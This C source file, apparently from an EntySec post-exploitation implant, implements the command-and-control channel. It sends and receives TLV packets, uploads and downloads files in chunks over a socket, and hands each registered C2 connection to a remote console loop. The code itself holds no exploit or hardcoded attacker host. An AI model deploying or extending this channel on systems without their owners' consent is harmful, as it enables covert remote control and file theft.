/*
 * MIT License
 *
 * Copyright (c) 2020-2023 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <sigar.h>

#include <sys/time.h>
#include <sys/types.h>
#include <sys/select.h>

#include <log.h>
#include <tlv.h>
#include <api.h>
#include <tab.h>
#include <node.h>
#include <console.h>
#include <c2.h>
#include <tlv_types.h>

#include <uthash/uthash.h>

c2_t *c2_create(int id, int fd, char *name)
{
    c2_t *c2;

    c2 = calloc(1, sizeof(*c2));

    if (c2 != NULL)
    {
        c2->id = id;
        c2->fd = fd;

        if (name != NULL)
        {
            c2->name = strdup(name);
        }
        else
        {
            c2->name = NULL;
        }

        c2->tlv_pkt = NULL;

        c2->dynamic.t_count = 0;
        c2->dynamic.n_count = 0;
        c2->dynamic.tabs = NULL;
        c2->dynamic.nodes = NULL;
        c2->dynamic.api_calls = NULL;

        sigar_open(&c2->sigar);

        return c2;
    }

    return NULL;
}

int c2_write_status(c2_t *c2, int status)
{
    tlv_pkt_t *tlv_pkt;

    tlv_pkt = tlv_pkt_create();

    if (tlv_pkt == NULL)
    {
        return -1;
    }

    tlv_pkt_add_int(tlv_pkt, TLV_TYPE_STATUS, status);

    if (c2_write(c2, tlv_pkt) < 0)
    {
        goto fail;
    }

    tlv_pkt_destroy(tlv_pkt);
    return 0;

fail:
    tlv_pkt_destroy(tlv_pkt);
    return -1;
}

int c2_read_status(c2_t *c2, int *status)
{
    tlv_pkt_t *tlv_pkt;

    if (c2_read(c2, &tlv_pkt) < 0)
    {
        goto fail;
    }

    if (tlv_pkt_get_int(tlv_pkt, TLV_TYPE_STATUS, status) < 0)
    {
        goto fail;
    }

    tlv_pkt_destroy(tlv_pkt);
    return 0;

fail:
    tlv_pkt_destroy(tlv_pkt);
    return -1;
}

int c2_write_file(c2_t *c2, FILE *file)
{
    int bytes_read;
    int status;

    unsigned char *buffer;
    tlv_pkt_t *tlv_pkt;

    buffer = malloc(TLV_FILE_CHUNK);

    if (file == NULL || buffer == NULL)
    {
        c2_write_status(c2, API_CALL_ENOENT);
        return -1;
    }

    if (c2_write_status(c2, API_CALL_SUCCESS) < 0)
    {
        return -1;
    }

    if (c2_read_status(c2, &status) < 0)
    {
        return -1;
    }

    if (status == API_CALL_ENOENT)
    {
        tlv_pkt_destroy(tlv_pkt);
        return -1;
    }

    while ((bytes_read = fread(buffer, 1, TLV_FILE_CHUNK, file)) > 0)
    {
        tlv_pkt = tlv_pkt_create();

        if (tlv_pkt_add_bytes(tlv_pkt, TLV_TYPE_FILE, buffer, bytes_read) < 0)
        {
            goto fail;
        }

        if (tlv_pkt_add_int(tlv_pkt, TLV_TYPE_STATUS, API_CALL_WAIT) < 0)
        {
            goto fail;
        }

        if (c2_write(c2, tlv_pkt) < 0)
        {
            goto fail;
        }

        memset(buffer, 0, TLV_FILE_CHUNK);

        tlv_pkt_destroy(tlv_pkt);
    }

    free(buffer);
    return 0;

fail:
    tlv_pkt_destroy(tlv_pkt);
    free(buffer);
    return -1;
}

int c2_read_file(c2_t *c2, FILE *file)
{
    int status;
    int bytes_read;

    unsigned char *buffer;
    tlv_pkt_t *tlv_pkt;

    if (c2_read_status(c2, &status) < 0)
    {
        return -1;
    }

    if (status == API_CALL_ENOENT)
    {
        return -1;
    }

    if (file == NULL)
    {
        c2_write_status(c2, API_CALL_ENOENT);
        return -1;
    }

    if (c2_write_status(c2, API_CALL_SUCCESS) < 0)
    {
        return -1;
    }

    for (;;)
    {
        tlv_pkt = tlv_pkt_create();

        if (c2_read(c2, &tlv_pkt) < 0)
        {
            goto fail;
        }

        if (tlv_pkt_get_int(tlv_pkt, TLV_TYPE_STATUS, &status) < 0)
        {
            goto fail;
        }

        if (status != API_CALL_WAIT)
        {
            tlv_pkt_destroy(tlv_pkt);
            break;
        }

        if ((bytes_read = tlv_pkt_get_bytes(tlv_pkt, TLV_TYPE_FILE, &buffer)) < 0)
        {
            goto fail;
        }

        fwrite(buffer, 1, bytes_read, file);

        free(buffer);
        tlv_pkt_destroy(tlv_pkt);
    }

    return 0;

fail:
    tlv_pkt_destroy(tlv_pkt);
    return -1;
}

int c2_write(c2_t *c2, tlv_pkt_t *tlv_pkt)
{
    tlv_pkt_t *tlv_count;

    tlv_count = tlv_pkt_create();

    if (tlv_count == NULL)
    {
        return -1;
    }

    if (tlv_pkt_add_int(tlv_count, TLV_TYPE_COUNT, tlv_pkt->count) < 0)
    {
        goto fail;
    }

    if (tlv_pkt_write(c2->fd, tlv_count) < 0)
    {
        goto fail;
    }

    log_debug("* Writing TLV packets (%d)\n", tlv_pkt->count);

    return tlv_pkt_write(c2->fd, tlv_pkt);

fail:
    tlv_pkt_destroy(tlv_count);
    return -1;
}

int c2_read(c2_t *c2, tlv_pkt_t **tlv_pkt)
{
    int iter;
    int count;

    *tlv_pkt = tlv_pkt_create();

    if (*tlv_pkt == NULL)
    {
        return -1;
    }

    if (tlv_pkt_read(c2->fd, *tlv_pkt) < 0)
    {
        goto fail;
    }

    log_debug("* Processing read TLV count\n");

    if (tlv_pkt_get_int(*tlv_pkt, TLV_TYPE_COUNT, &count) < 0)
    {
        goto fail;
    }

    log_debug("* Reading TLV packets (%d)\n", count);

    for (iter = 0; iter < count; iter++)
    {
        if (tlv_pkt_read(c2->fd, *tlv_pkt) < 0)
        {
            goto fail;
        }
    }

    return 0;

fail:
    tlv_pkt_destroy(*tlv_pkt);
    return -1;
}

void c2_add(c2_t **c2_table, int id, int fd, char *name)
{
    c2_t *c2;
    c2_t *c2_new;

    HASH_FIND_INT(*c2_table, &id, c2);

    if (c2 == NULL)
    {
        c2_new = c2_create(id, fd, name);

        if (c2_new != NULL)
        {
            HASH_ADD_INT(*c2_table, id, c2_new);
            log_debug("* Added net C2 entry (%d) - (%s)\n", id, name);
        }
    }
}

void c2_destroy(c2_t *c2, int flags)
{
    tabs_free(c2->dynamic.tabs);
    nodes_free(c2->dynamic.nodes);
    api_calls_free(c2->dynamic.api_calls);

    sigar_close(c2->sigar);

    if (flags != FD_LEAVE)
    {
        close(c2->fd);
    }

    if (c2->name != NULL)
    {
        free(c2->name);
    }

    free(c2);
}

void c2_init(c2_t *c2_table)
{
    c2_t *c2;
    tlv_pkt_t *tlv_pkt;

    for (c2 = c2_table; c2 != NULL; c2 = c2->hh.next)
    {
        log_debug("* Initializing net C2 server (%d) - (%s)\n",
                  c2->id, c2->name);
        tlv_pkt = tlv_pkt_create();

        if (tlv_pkt != NULL)
        {
            if (tlv_pkt_add_string(tlv_pkt, TLV_TYPE_UUID, c2->name) >= 0)
            {
                if (c2_write(c2, tlv_pkt) >= 0)
                {
                    tlv_console_loop(c2);
                }
            }
        }

        HASH_DEL(c2_table, c2);

        tlv_pkt_destroy(tlv_pkt);
        c2_destroy(c2, FD_LEAVE);
    }

    free(c2_table);
}
